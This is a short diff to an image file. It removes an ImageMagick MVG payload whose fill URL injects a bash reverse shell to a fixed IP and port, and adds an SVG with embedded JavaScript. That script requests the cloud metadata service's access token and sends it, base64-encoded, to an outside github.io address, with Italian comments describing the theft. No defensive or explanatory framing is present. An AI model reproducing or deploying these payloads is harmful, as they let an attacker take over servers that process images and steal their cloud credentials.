@@ -1,4 +1,21 @@
-push graphic-context
-viewbox 0 0 640 480
-fill 'url(https://example.com/";bash -i >& /dev/tcp/104.251.180.58/4444 0>&1;")'
-pop graphic-context
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="100" height="100">
+  <script type="text/javascript">
+    <![CDATA[
+      // Prova a connettersi a metadata
+      fetch('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', {
+        headers: {'Metadata-Flavor': 'Google'}
+      })
+      .then(r => r.text())
+      .then(token => {
+        // Invia token al tuo server
+        fetch('https://matteocico.github.io/Kommunicate/log?token=' + btoa(token));
+      })
+      .catch(e => {
+        fetch('https://matteocico.github.io/Kommunicate/log?error=' + btoa(e.message));
+      });
+    ]]>
+  </script>
+  <rect width="100" height="100" fill="red"/>
+</svg>
